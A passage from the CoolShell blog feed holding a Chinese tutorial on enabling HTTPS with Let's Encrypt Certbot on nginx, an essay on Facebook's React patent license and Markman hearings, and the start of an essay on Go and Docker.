<p><img alt="image placeholder" >今天，我把CoolShell变成https的安全访问了。我承认这件事有点晚了，因为之前的HTTP的问题也有网友告诉我，被国内的电信运营商在访问我的网站时加入了一些弹窗广告。另外，HTTP的网站在搜索引擎中的rank会更低。所以，这事早就应该干了。现在用HTTP访问CoolShell会被得到一个 301 的HTTPS的跳转。下面我分享一下启用HTTPS的过程。</p>
<p>我用的是 <a href="https://letsencrypt.org" target="_blank" rel="noopener noreferrer">Let’s Encrypt</a>这个免费的解决方案。Let’s Encrypt 是一个于2015年推出的数字证书认证机构，将通过旨在消除当前手动创建和安装证书的复杂过程的自动化流程，为安全网站提供免费的SSL/TLS证书。这是由<a href="https://letsencrypt.org/isrg/" target="_blank" rel="noopener noreferrer">互联网安全研究小组</a>（ISRG – Internet Security Research Group，一个公益组织）提供的服务。主要赞助商包括<a title="电子前哨基金会" href="https://www.eff.org" target="_blank" rel="noopener noreferrer">电子前哨基金会</a>，<a class="mw-redirect" title="Mozilla基金会" href="https://www.mozilla.org/foundation/" target="_blank" rel="noopener noreferrer">Mozilla基金会</a>，<a title="Akamai" href="https://www.akamai.com/" target="_blank" rel="noopener noreferrer">Akamai</a>以及Cisco等公司（<a href="https://letsencrypt.org/sponsors/" target="_blank" rel="noopener noreferrer">赞助商列表</a>）。<sup id="cite_ref-3" class="reference"></sup></p>
<p>2015年6月，Let’s Encrypt得到了一个存储在硬件安全模块中的离线的RSA根证书。这个由IdenTrust证书签发机构交叉签名的根证书被用于签署两个证书。其中一个就是用于签发请求的证书，另一个则是保存在本地的证书，这个证书用于在上一个证书出问题时作备份证书之用。因为IdenTrust的CA根证书目前已被预置于主流浏览器中，所以Let’s Encrypt签发的证书可以从项目开始就被识别并接受，甚至当用户的浏览器中没有信任ISRG的根证书时也可以。</p>
<p><span id="more-18094"></span></p>
<p>以上介绍文字来自 Wikipedia 的 <a href="https://zh.wikipedia.org/wiki/Let%27s_Encrypt" target="_blank" rel="noopener noreferrer">Let’s Encrypt 词条</a>。</p>
<p>为你的网站来安装一个证书十分简单，只需要使用电子子前哨基金会EFF的 <a href="https://certbot.eff.org" target="_blank" rel="noopener noreferrer">Certbot</a>，就可以完成。</p>
<p style="padding-left: 30px;">1）首先，打开 <a href="https://certbot.eff.org" target="_blank" rel="noopener noreferrer">https://certbot.eff.org</a> 网页。</p>
<p style="padding-left: 30px;">2）在那个机器上图标下面，你需要选择一下你用的 Web 接入软件 和你的 操作系统。比如，我选的，<code>nginx</code> 和 <code>Ubuntu 14.04</code></p>
<p style="padding-left: 30px;">3）然后就会跳转到一个安装教程网页。你就照着做一遍就好了。</p>
<p>以Coolshell.cn为例 – Nginx + Ubuntu</p>
<p>首先先安装相应的环境：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sudo apt-get update
$ sudo apt-get install software-properties-common
$ sudo add-apt-repository ppa:certbot/certbot
$ sudo apt-get update
$ sudo apt-get install python-certbot-nginx
</pre>
<p>然后，运行如下命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sudo certbot --nginx
</pre>
<p><code>certbot</code> 会自动检查到你的 <code>nginx.conf</code> 下的配置，把你所有的虚拟站点都列出来，然后让你选择需要开启 https 的站点。你就简单的输入列表编号（用空格分开），然后，certbot 就帮你下载证书并更新 <code>nginx.conf</code> 了。</p>
<p>你打开你的 <code>nginx.conf</code> 文件 ，你可以发现你的文件中的 <code>server</code> 配置中可能被做了如下的修改：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">listen 443 ssl; # managed by Certbot
ssl_certificate /etc/letsencrypt/live/coolshell.cn/fullchain.pem; # managed by Certbot
ssl_certificate_key /etc/letsencrypt/live/coolshell.cn/privkey.pem; # managed by Certbot
include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot</pre>
<p>和</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"> # Redirect non-https traffic to https
if ($scheme != "https") {
  return 301 https://$host$request_uri;
} # managed by Certbot</pre>
<p> </p>
<p>这里建议配置 http2，这要求 Nginx 版本要大于 1.9.5。HTTP2 具有更快的 HTTPS 传输性能，非常值得开启（<a href="https://blog.httpwatch.com/2015/01/16/a-simple-performance-comparison-of-https-spdy-and-http2/" target="_blank" rel="noopener noreferrer">关于性能你可以看一下这篇文章</a>）。需要开启HTTP/2其实很简单，只需要在 <code>nginx.conf</code> 的 <code>listen 443 ssl;</code> 后面加上 <code>http2</code> 就好了。如下所示：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">listen 443 ssl http2; # managed by Certbot 
ssl_certificate /etc/letsencrypt/live/coolshell.cn/fullchain.pem; # managed by Certbot 
ssl_certificate_key /etc/letsencrypt/live/coolshell.cn/privkey.pem; # managed by Certbot 
include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot</pre>
<p>然后，就 <code>nginx -s reload</code> 就好了。</p>
<p>但是，<strong>Let’s Encrypt 的证书90天就过期了</strong>，所以，你还要设置上自动化的更新脚本，最容易的莫过于使用 <code>crontab</code> 了。使用 <code>crontab -e</code> 命令加入如下的定时作业（每个月都强制更新一下）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">0 0 1 * * /usr/bin/certbot renew --force-renewal
5 0 1 * * /usr/sbin/service nginx restart</pre>
<p>当然，你也可以每天凌晨1点检查一下：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">0 1 * * * certbot renew </code></p>
<p>注：crontab 中有六个字段，其含义如下：</p>
<ul>
<li>第1个字段：分钟 (0-59)</li>
<li>第2个字段：小时 (0-23)</li>
<li>第3个字段：日期 (1-31)</li>
<li>第4个字段：月份 (1-12 [12 代表 December])</li>
<li>第5个字段：一周当中的某天 (0-7 [7 或 0 代表星期天])</li>
<li>/path/to/command – 计划执行的脚本或命令的名称</li>
</ul>
<p><strong>这么方便的同时，我不禁要问，如果是一些恶意的钓鱼网站也让自己的站点变成https的，这个对于一般用来说就有点难以防范了。哎……</strong></p>
<p>当然，在nginx或apache上启用HTTPS后，还没有结束。因为你可能还需要修改一下你的网站，不然你的网站在浏览时会出现各种问题。</p>
<p><strong>启用HTTPS后，你的网页中的所有的使用 <code>http://</code> 的方式的地方都要改成 <code>https://</code> 不然你的图片，js， css等非https的连接都会导致浏览器抱怨不安全而被block掉</strong>。所以，你还需要修改你的网页中那些 hard code <code>http://</code> 的地方。</p>
<p>对于我这个使用wordpress的博客系统来说，有这么几个部分需要做修改。</p>
<p style="padding-left: 30px;">1）首先是 wordpress的 常规设置中的 “<strong>WordPress 地址</strong>” 和 “<strong>站点地址</strong>” 需要变更为 https 的方式。</p>
<p style="padding-left: 30px;">2）然后是文章内的图片等资源的链接需要变更为 https 的方式。对此，你可以使用一个叫 “<a href="https://wordpress.org/plugins/search-regex/" target="_blank" rel="noopener noreferrer">Search Regex</a>” 插件来批量更新你历史文章里的图片或别的资源的链接。比如：把 <code>http://coolshell.cn</code> 替换成了 <code>https://coolshell.cn</code></p>
<p style="padding-left: 30px;">3）如果你像我一样启用了文章缓存（我用的是<a href="https://wordpress.org/plugins/wp-super-cache/" target="_blank" rel="noopener noreferrer">WP-SuperCache</a>插件），你还要去设置一下 “<strong>CDN</strong>” 页面中的 “Site URL” 和 “off-site URL” 确保生成出来的静态网页内是用https做资源链接的。</p>
<p>基本上就是这些事。希望大家都来把自己的网站更新成 https 的。</p>
<p>嗯，12306，你什么时候按照这个教程做一下你的证书？</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-08-26T14:06:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/18094.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 关于Facebook 的 React 专利许可证 ]]></title>
<link>https://coolshell.cn/articles/18140.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >随着Apache、百度、Wordpress都在和Facebook的React.js以及其专利许可证划清界限，似乎大家又在讨论Facebook的这个BSD+PATENT的许可证问题了。这让我想起了之前在Medium读过的一篇文章——《<a href="https://medium.com/@dwalsh.sdlr/react-facebook-and-the-revokable-patent-license-why-its-a-paper-25c40c50b562" target="_blank" rel="noopener noreferrer">React, Facebook, and the Revocable Patent License, Why It’s a Paper</a>》，我觉得那篇文章写的不错，而且还是一个会编程的律师写的，所以有必要把这篇文章传播到中文社区这边来。注意，我不会全部翻译，我只是用我的语言来负责搬运内容和观点，我只想通过这篇文章让大家了解一下这个世界以及专利相关的知识，这样可以避免你看到某乎的“怎么看待XXX”这类的问题时人云亦云，能有自己的独立思考和自我判断。;-)</p>
<p>这篇文章的作者叫Dennis Walsh，他自称是亚历桑那和加利福尼亚州的律师，主要针对版权法和专利诉论的法律领域。但是这个律师不一样，他更很喜欢商业和软件多一些。现在他用React/GraphQL/Elixir在写一个汽车代理销售相关的软件，而且已经发布到第2版了。</p>
<p>首先，作者表明，专利法经常被人误解，因为其实充满了各种晦涩难懂的法律术语，所以，作者用个例子来讲述专利的一个原则 —— <strong>专利并不是授于让你制造或开发的权利，而是授予你可以排他的权利。（</strong>事实上似乎也是这样，申请专利很多时候都不是为了制作相关的产品，而是为了防止别人使用类似的技术制作相关的产品）</p>
<p><span id="more-18140"></span></p>
<p>如果有公司X为铅笔申请了专利，而另一家公司Y为把用于铅笔的橡皮擦申请了专利。那么，公司X可以阻止公司Y来生产铅笔，而对带橡皮擦的铅笔没办法，但是公司Y的专利可以让公司X不能生产带有橡皮擦的铅笔。</p>
<p>所以，公司Y的橡皮擦专利又被广泛地叫作“<a href="https://definitions.uslegal.com/b/blocking-patent/" target="_blank" rel="noopener noreferrer">Blocking Patent</a>”。公司Y不能说他发明了铅笔，因为这是公司X的专利，但是，他们可以让公司X无法对铅笔做出某些改进。</p>
<p>于是，因为这种 Blocking Patent 存在，对于开源的公司是不利的，因为根据上面的那个例子来说，开源公司就是公司X，他们做了一个基础的软件，而公司Y在上面做了些改进，并注册成了专利，从而导致开源的公司X无法对它基础开源软件作出被公司Y专利阻止的改进，开源的公司X希望能够自由地使用公司Y的橡皮擦专利，因为毕竟是它发明了铅笔并放弃了铅笔的专利。</p>
<p>于是就出来了“专利反击条款”（<a href="https://en.wikipedia.org/wiki/Software_patents_and_free_software#Patent_retaliation" target="_blank" rel="noopener noreferrer">Patent Retaliation Clauses</a>）。一般来说有两种专利条款，一种是弱条款，一种是强条款。</p>
<p>Weak Patent Retaliation Clauses – 这种条款声明，如果许可证持有者用某个专利来打击许可证颁布者，那么专利就视为终止。用人话来表达就是，公司X做了一个开源铅笔，而公司Y注册了橡皮檫专利。此时，公司X做了一支带像皮擦的铅笔，而公司Y马上对公司X提起专利侵权诉讼。那么，公司Y就失去了对底层铅笔的专利控制。（正如前面所说的，公司Y的橡皮擦专利因为在起诉公司X的开源铅笔，而失去了对开源铅笔的专利排他权利）</p>
<p>Strong Patent Retailiation Clauses – 这种条款声明比“弱条款”要的更多。具体来说就是，任何专利声明终结许可证，而不管这个专利有没有和你基础的软件有关系。用人话来说就是，公司Y使用他们的热气球专利来起诉公司X，那么公司Y就失去了他们对铅笔的专利限制。</p>
<p>我个人理解起来，这两种条款看上去是防御性质的。</p>
<p>Facebook的React的Patent License如下：</p>
<blockquote><p>The license granted hereunder will terminate, automatically and without notice,if you (or any of your subsidiaries, corporate affiliates or agents) initiatedirectly or indirectly, or take a direct financial interest in, any Patent Assertion: (i) against Facebook or any of its subsidiaries or corporateaffiliates, (ii) against any party if such Patent Assertion arises in whole orin part from any software, technology, product or service of Facebook or any ofits subsidiaries or corporate affiliates, or (iii) against any party relating to the Software. Notwithstanding the foregoing, if Facebook or any of itssubsidiaries or corporate affiliates files a lawsuit alleging patentinfringement against you in the first instance, and you respond by filing apatent infringement counterclaim in that lawsuit against that party that isunrelated to the Software, the license granted hereunder will not terminateunder section (i) of this paragraph due to such counterclaim.</p></blockquote>
<p>这些条款中和基础软件没有任何关系，所以，<strong>这个条款是“强专利反击条款”</strong>。</p>
<p>在后面，本文的作者又解解释了，为什么React的“强专利反击条款”就跟没有似的。他在文中针对一些歇斯底里的言论，如：“Facebook不用害怕专利诉讼了，而且他可以随时偷袭你家的专利仓库”，也作出了一些解释来分析这个事。</p>
<p>Contractural Liability – 意思是说，专利方面的东西只会影响专利上的事，而不会影响和专利无关的事，React底层协议是BSD-3许可证还是会被保留。换句话说，React的“强专利反击条款”只生效于专利层面，而不会对非常专利的软件使用产生问题，如果和专利无关，React还是走BSD-3的许可协议。</p>
<p>Copyright Liability – 这个和Contractural Liablitity 一样。作者说，如果有人有特别的案例或是有说服力的论据来说明Facebook的这个条款会作用于非专利的地方，那么，请告诉他。</p>
<p>Patent Liability – 专利的责任和损害是两件事，非专业人士总是会把其搞混。</p>
<p>第一个问题是Liability， 要搞清这个事，得搞清“Patent’s Claims”，而不是这个技术的技术规格说明，技术规格说明和权力主张是两码事。作者说，现在的很多专利都是一些想法，很多投机份子随便一拍脑袋就发明出一个想法，然后就去注册专利了。但是可以被用来法律执行的只有“Patent’s Claims”（专利的权利主张），而不是那些想法。这些权利主张相当相当的晦涩难读，而且是会故意被模糊掉的，因为，当你清楚的定义了你的发明是什么，那么，就可以清楚的定义出来什么不是你的发明。比如：一个铅笔专利权利主张里说，“这一个用石墨和木头组合起来的写字工具”，那么，只要我不用木头和石墨来做组合，而是用塑料来做组合，那么我就不是专利侵权。所以，一般来说，专利主张是会更为通用一些，比如，“这是一个用于涂画表面的装置，其包括：与涂画端相连的握持端”。作者这里给了一个<a href="https://www.google.com/patents/US8046721" target="_blank" rel="noopener noreferrer">苹果公司的滑动解锁专利</a>的示例。可以感受一下产品规格说明和专利权利主张完全是两码事。</p>
<p>专利这些事，在法律界里是非常非常困难作出评估的。所以，这个社会每年都会给律师们几十亿美金来一遍又一遍地回答这些问题，而且律师还经常回答错了。而对于美国的法律，对于专利诉讼会有一个叫<a href="https://en.wikipedia.org/wiki/Markman_hearing" target="_blank" rel="noopener noreferrer">Markman hearing的审前听证会</a>（马克曼听证会），自从1996年美国最高法的“<a href="https://en.wikipedia.org/wiki/Markman_v._Westview_Instruments,_Inc." target="_blank" rel="noopener noreferrer">马克曼诉威斯幽仪器公司案</a>”这个听证会就变成了一个惯例，美国联邦法院用这个听证会来向决定专利权利主张的解释，而且，上诉法院还经常性的推翻审判法院的裁决。（对于美国法律来说，一般是法官认证法律，陪审团认定事实，然而，对于专利而言，1996年的那个案件认为专利术语是一个需要法官决定的法律问题，而不是陪审团决定的事实问题。关于马克曼听证会的事，可以参看本文未尾的附录）</p>
<p>所以，要决定Facebook的专利责任，我们需要评估Facebook的专利及其权利主张，而不是技术规格说明。具体来说，要明确Facebook对于React这个底层技术的专利权利主张是什么？但是作者搜了一下，发现什么也没有找到。也就是说，对于USPTO（美国专利商标局）或法院来说，他们没办法对Facebook的这样没有为React申请专利的方式来执行任何和专利的诉讼，也就是说，Facebook的这个React License的条款，美国政府是无法在法律上支持的。</p>
<p>第二个问题是专利损害。就算是Facebook可以评估出来一个合法可执行的专利来保护React，对于专利损害也是很有问题的。作者说他到目前还没有发现一个开源软件被专利侵权的事，就算有这样的案例，也不会是这里说的这个事。作者觉得在这个事上操作起来就是一个笑话。</p>
<p>另外，作者认为，React 专利许可证这个事就是个纸老虎。因为，一方面，这个专利不像电信通讯里的那些专利，你拿不掉。作者认为要从你的代码中把React去掉虽然难，但是也不是什么很难的事，另外，要打这样的专利官司，一般来说，在美国至少要花100-200万美金的费用才能发起诉讼，而要胜诉则需要需要200多万到2000万美金的费用，你觉得你要花多钱才能把React从你的代码库中剔除？肯定比这钱少。</p>
<p>作者还认为，Facebook玩这个事虽然出发点不错，但是感觉并不聪明，从目前的情况看下来，就像他想咬你一口，但却没有牙。</p>
<p>后面，作者还说了一下，转成别的框架会不会有问题？比如：你用Preact/Vue或是你自研的东西？作者说，未必，如果Facebook真的为React注册了专利，比如：React里的组件技术、虚拟DOM渲染技术等等。那么，你用Preact/Vue或是带这样技术的自研的框架，那么，从你使用的第一天就在侵犯Facebook的专利权了。然而，使用React反而不会有这么大的风险，因为Facebook让你免费的用React。作者说，用别的框架的法律风险比用其它替代品的风险更高。</p>
<p>后面，作者也更新了一篇文章 《<a href="https://medium.com/@dwalsh.sdlr/using-graphql-why-facebook-now-owns-you-3182751028c9" target="_blank" rel="noopener noreferrer">Using GraphQL? Why Facebook Now Owns You</a>》，意思是，用React可能还好，但是用GraphQL就有问题了。因为找到了GraphQL的专利—— <a href="https://patents.google.com/patent/US9646028" target="_blank" rel="noopener noreferrer">“Graph Query Logic”</a>。</p>
<p>后来我查了一下，我发现，React也有个相关的专利—— “<a href="https://patents.google.com/patent/US9003278" target="_blank" rel="noopener noreferrer">Efficient event delegation in browser scripts</a> ”，看上去和虚拟DOM渲染有关。Holy Shit!</p>
<p>好了，用还是不用React我也不知道，总之，这个世界比较复杂，我只是想借这篇文章来学习一下法律上的相关东西，欢迎听到大家的观点。</p>
<p>最后，请允许我调侃一下来结束本文——“不用担心React的许可证问题，因为前端不是一年半就用新的框架重写一次么？”哈哈。</p>
<p><strong>更新：Facebook官方于20017年9月23日在其官方blog上发贴《<a href="https://code.facebook.com/posts/300798627056246/relicensing-react-jest-flow-and-immutable-js" target="_blank" rel="noopener noreferrer">Relicensing React, Jest, Flow, and Immutable.js</a>》决定取消之前的带专利的许可证。</strong></p>
<h4>延伸阅读</h4>
<h5>马克曼听证会 – Markman Hearing</h5>
<p>马克曼听证会的一些背景知识，下面的文字来源于《<a href="http://www.sipo.gov.cn/sipo2013/mtjj/2013/201303/t20130320_788543.html" target="_blank" rel="noopener noreferrer">“马克曼听证”制度的由来及启示</a>》</p>
<p>与美国专利诉讼的悠长历史相比，1996年才经美国最高法院确立的“马克曼听证”（Markman Hearing，也称为Claim Construction，即权利要求书的解释）无疑是一项年轻的制度。但由于几乎所有的专利侵权诉讼中都会遇到涉案专利权利要求书的解释这一核心问题，且因“马克曼听证”结果往往清楚地预示了案件结果，经“马克曼听证”获得有利结论的一方一旦据此向法庭提起不审即判的动议，专利侵权诉讼往往可就此快速了结，因此该制度的确立成为美国专利诉讼历史上的一件大事。</p>
<p>“马克曼听证”制度的由来</p>
<p>“马克曼听证”制度确立之前，在专利侵权诉讼中的权利要求书解释，通常交由陪审团在对案件事实进行裁决时一并做出，且并不会在诉讼文件上单独就陪审团这一问题的判断进行记录。1991年，马克曼（Markman）先生因认为其拥有的专利号为RE33054的“干洗衣物贮存及追踪控制装置”专利权被Westview公司所侵犯，遂向宾夕法尼亚州东区联邦地方法院提起了专利侵权诉讼。</p>
<p>该专利是用扫描的方式，将客户的衣物编号扫描后输入电脑中做分类标示，并在衣物干洗过程中追踪衣物位置，干洗完成后自动将衣物放回客户固定的存贮位置。被告的产品则是同时运用扫描器和电脑两种方式，将客户干洗衣物的资料存入电脑并显示费用、日期等相关信息。本案陪审团的裁决认为被告装置构成对原告专利权利的侵犯，但该地方法院认为系争专利与被告装置在功能实施上并不一致，遂推翻陪审团的裁决，判决被告不构成侵权。</p>
<p>马克曼不服，于1995年向联邦上诉法院提起上诉，但其上诉理由仅为联邦地方法院错误地解释了陪审团关于专利权利要求书解释中某个词语的涵义。联邦上诉法院在审理该案时，将案件的核心问题定为两个：一是原告对于请求项解释有无权利请求陪审团裁决;二是联邦地方法院是否正确地解释了“Inventory”一词。该院多数法官经审理后认为，权利要求书范围的解释与确定，属于法律问题而非事实问题，因而属于法院权限，而不应交由陪审团决定，且此前将此问题交由陪审团确定并不妥当。同时，由于认为原告专利与被告装置存在实质功能上的差异，联邦上诉法院亦不认为被告构成专利侵权。少数持不同意见的该院法官主要是质疑这一结论违反了美国第七宪法修正案（即所有根据美国法律进行的普通法诉讼，只要争议金额超过20美元，即有要求陪审团审判的权利）。</p>
<p>马克曼不服，向最高法院提出上诉。1996年4月23日，美国最高法院就马克曼诉Westview器械公司案（Markman v. Westview Instruments, Inc. 517 U.S. 370 （1996））做出终审裁决，裁决认定：权利要求书的解释是联邦地区法院法官应当处理的法律问题，而不是应当由陪审团来认定的事实问题，尽管在解释权利要求书的过程中可能会包含一些对于事实问题的解释，且这样做并不违反第七修正案赋予给陪审团的权利。这一裁决标志着“马克曼听证”制度的正式确立。</p>
<p>“马克曼听证”制度的不足</p>
<p>该案判决是美国专利诉讼史上的一个重大转折。“马克曼听证”成为法官专门用于解释专利权利要求的一个经常性听证程序，用以解决专利侵权诉讼的核心问题。由于该听证并非普遍适用，因此，十几年来，联邦民事诉讼规则并未正式对其有任何规定，而是给予法院绝对的自由裁量权。但是，何时可以进行“马克曼听证”?如何进行?是否有必要进行?类似问题在一定程度上困扰了审理专利侵权案件较多的法院。</p>
<p>2001年，加州北区联邦地区法院率先制定了供本法院使用的专利审判专属规则（Patent Local Rules），其中第四部分即为权利要求书的解释程序（Claim Construction Proceddings），对“马克曼听证”的时间、流程、限制及当事人的义务均进行了规定。此后，各州纷纷效仿。目前，乔治亚州北区联邦法院、得克萨斯州东区联邦法院、得克萨斯州南区联邦法院、宾夕法尼亚州西区联邦法院等都制订了书面的“马克曼听证”程序指南。近年来，不断有新的案例在解释与细化着“马克曼听证”，如2006年的Wilson Sporting Goods Co.诉Hillerich &amp; Bradsby Co.案，2005年的Phillips诉AWH Corp.案，2008年的Howmedica Osteonics Corp.诉Wright Medical Technology, Inc.案，这些司法实践大大拓展与丰富了“马克曼听证”使用的实体和程序规则，使之日渐成为美国专利诉讼中一个复杂、完备的司法程序。以至于竟然有人开发了模拟“马克曼听证”程序，只要你愿意，可以下载并训练，以熟悉和确保有真正的权利要求书解释时不会出现不利于自己的问题。</p>
<p>但是，该听证带来的问题也逐渐受到重视。有人质疑说该程序导致专利诉讼费用增加，因为“马克曼听证”通常会单独进行，且程序复杂，因此导致当事人花费大量的时间与精力，更为重要的是，由于40%至60%的联邦地区法院案件会在联邦巡回上诉法院被推翻，因此，花费巨大的“马克曼听证”似乎价值有限。同时，权利要求书的解释要求是不多不少，忠实于技术发明思想与发明事实，但由于地区法院分散，法官的相关技术知识不十分专业，将权利要求书解释这样的问题交给他们，难免会带来一些无法克服的问题。</p>
<p>“马克曼听证”制度的启示</p>
<p>我国民事诉讼中并无陪审团制度，案件的事实问题与法律问题均由法官审理与确定。在专利侵权诉讼中，对于案件中涉及到的技术问题可以通过专家鉴定等方式解决，但并不因此免除法官审理案件的义务，即法律问题的判断归于法官，事实的法律属性判断仍然归于法官。同时，权利要求书的解释在我国的专利侵权诉讼中并不是一个单独的程序，而是合并在案件审理过程中。因此，仅就我国的司法审判而言，“马克曼听证”制度并无直接的借鉴意义。</p>
<p>但是，对于那些已经走出和正在走出国门的企业来说，了解与掌握这一重要的专利诉讼程序却是极其重要的。通领科技集团的积极尝试充分证明了这一点，而且随着这一程序的不断成熟，美国国际贸易法院（ITC）也开始在审理时适用“马克曼听证”制度。所以，知道“马克曼听证”意味着什么，确保所提交的用于解释权利要求的文件确实充分，学会利用“马克曼听证”，无论是对于破解美国的专利诉讼威胁，还是为未来准备有效的法律武器，无疑都非常重要。（知识产权报　作者　魏玮）</p>
<p> </p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-09-19T14:08:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/18140.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Go语言、Docker 和新技术 ]]></title>
<link>https://coolshell.cn/articles/18190.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >上个月，作为 Go 语言的三位创始人之一，Unix 老牌黑客罗勃·派克（Rob Pike）在新文章“<a href="https://commandcenter.blogspot.com/2017/09/go-ten-years-and-climbing.html" target="_blank" rel="noopener noreferrer">Go: Ten years and climbing</a>”中，回顾了一下 Go 语言的发展过程。其中提到，Go 语言这十年的迅猛发展大到连他们自己都没有想到，并且还成为了云计算领域中新一代的开发语言。还提到了，中国程序员对 Go 语言的热爱完全超出了他们的想象，甚至他们都不敢相信是真的。</p>
<p>这让我想起，我在 2015 年 5 月份拜访 Docker 公司在湾区的总部时，Docker 负责人也和我表达了相似的感叹：他们完全没有想到居然中国有那么多人喜欢 Docker，而且还有这么多人在为 Docker 做贡献，这让他们感到非常意外。此外，还跟我说，中国是除了美国本土之外的另一个如此喜欢 Docker 技术的国家，在其它国家都没有看到。</p>
<p>的确如他们所说，Go 语言和 Docker 这两种技术已经成为新一代的云计算技术，而且可以看到其发展态势非常迅猛。而中国也成为了像美国一样在强力推动这两种技术的国家。这的确是一件让人感到非常高兴的事，因为中国在跟随时代潮流这件事上已经做得非常不错了。</p>
<p>然而，从 2014-2015 年我在阿里推动 Docker 和 Go 语言的痛苦和失败过程中，以及这许多年来，有很多很多人问我是否要学 Go 语言，是否要学 Docker，Go 和 Docker 是否能用在生产线上，这些问题看来，对于 Go 语言和 Docker 这两种技术，在国内的技术圈中有相当大的一部分人和群体还在执观望或是不信任的态度。</p>
<p>所以，我想写这篇文章，从两个方面来论述一下我的观点和看法。</p>
<ul class="list-paddingleft-2">
<li>一个方面，为什么 Go 语言和 Docker 会是新一代的云计算技术。</li>
<li>另一个方面，作为技术人员，我们如何识别什么样的新技术会是未来的趋势。</li>
</ul>
<p>这两个问题是相辅相成的，所以我会把这两个问题揉在一起谈。</p>
<p><span id="more-18190"></span></p>
<p>虽然 Go 语言是在 2009 年底开源的，但我是从 2012 年才开始接触和学习 Go 语言的。我只花了一个周末两天的时间就学完了，而且在这两天，我还很快地写出了一个能工作很好的网页爬虫程序，以及一个简单的高并发文件处理服务，用于提取前面抓取的网页的关键内容。这两个程序都很简单，总共才写了不到 500 行代码。</p>
<p>我当时对 Go 语言有几点体会。</p>
<p><strong>第一，语言简单，上手快。</strong>Go 语言的语法特性简直是太简单了，简单到你几乎玩不出什么花招，直来直去的，学习曲线很低，上手非常快。</p>
<p><strong>第二，并行和异步编程几乎无痛点。</strong>Go 语言的 Goroutine 和 Channel 这两个神器简直就是并发和异步编程的巨大福音。像 C、C++、Java、Python 和 JavaScript 这些语言的并发和异步方式太控制就比较复杂了，而且容易出错，而 Go 解决这个问题非常地优雅和流畅。这对于编程多年受尽并发和异步折磨的我来说，完全就是让我眼前一亮的感觉。</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;">（图片来自 Medium：<a href="https://medium.com/@kevalpatel2106/why-should-you-learn-go-f607681fad65" target="_blank" rel="noopener noreferrer">Why should you learn Go?</a>）</p>
<p><strong>第三，Go 语言的 lib 库麻雀虽小五脏俱全。</strong>Go 语言的 lib 库中基本上有绝大多数常用的库，虽然有些库还不是很好，但我觉得不是问题，因为我相信在未来的发展中会把这些问题解决掉。</p>
<p><strong>第四，C 语言的理念和 Python 的姿态。</strong>C 语言的理念是信任程序员，保持语言的小巧，不屏蔽底层且底层友好，关注语言的执行效率和性能。而 Python 的姿态是用尽量少的代码完成尽量多的事。于是我能够感觉到，Go 语言想要把 C 和 Python 统一起来，这是多棒的一件事啊。</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;">（图片来自 Medium：<a href="https://medium.com/@kevalpatel2106/why-should-you-learn-go-f607681fad65" target="_blank" rel="noopener noreferrer">Why should you learn Go?</a>）</p>
<p>所以，即便 Go 语言存在诸多的问题，比如垃圾回收、异常处理、泛型编程等，但相较于上面这几个优势，我认为这些问题都是些小问题。于是就毫不犹豫地入坑了。</p>
<p>当然，一个技术能不能发展起来，关键还要看三点。</p>
<ul class="list-paddingleft-2">
<li>
<strong>有没有一个比较好的社区。</strong>像 C、C++、Java、Python 和 JavaScript 的生态圈都是非常丰富和火爆的。尤其是有很多商业机构参与的社区那就更为人气爆棚了，比如 Linux 的社区。</li>
<li>
<strong>有没有一个工业化的标准。</strong>像 C、C++、Java 都是有标准化组织的。尤其是 Java，其在架构上还搞出了像 J2EE 这样的企业级标准。</li>
<li>
<strong>有没有一个或多个杀手级应用。</strong>C、C++ 和 Java 的杀手级应用不用多说了，就算是对于 PHP 这样还不能算是一个好的编程语言来说，因为是 Linux 时代的第一个杀手级解决方案 LAMP 中的关键技术，所以，也发展起来了。</li>
</ul>
<p>上述的这三点是非常关键的，新的技术只需要占到其中一到两点就已经很不错了，何况有的技术，比如 Java，是三点全占到了，所以，Java 的发展是如此好。当然，除了上面这三点重要的，还有一些其它的影响因素，比如：</p>
<ul class="list-paddingleft-2">
<li>
<strong>学习曲线是否低，上手是否快。</strong>这点非常重要，C++ 在这点上越做越不好了。</li>
<li>
<strong>有没有一个不错的提高开发效率的开发框架。</strong>如：Java 的 Spring 框架，C++ 的 STL 等。</li>
<li>
<strong>是否有一个或多个巨型的技术公司作为后盾。</strong>如：Java 和 Linux 后面的 IBM、Sun……</li>
<li>
<strong>有没有解决软件开发中的痛点。</strong>如：Java 解决了 C 和 C++ 的内存管理问题。</li>
</ul>
<p>用这些标尺来量一下 Go 语言，我们可以清楚地看到：</p>
<ul class="list-paddingleft-2">
<li>Go 语言容易上手；</li>
<li>Go 语言解决了并发编程和写底层应用开发效率的痛点；</li>
<li>Go 语言有 Google 这个世界一流的技术公司在后面；</li>
<li>Go 语言的杀手级应用是 Docker，而 Docker 的生态圈在这几年完全爆棚了。</li>
</ul>
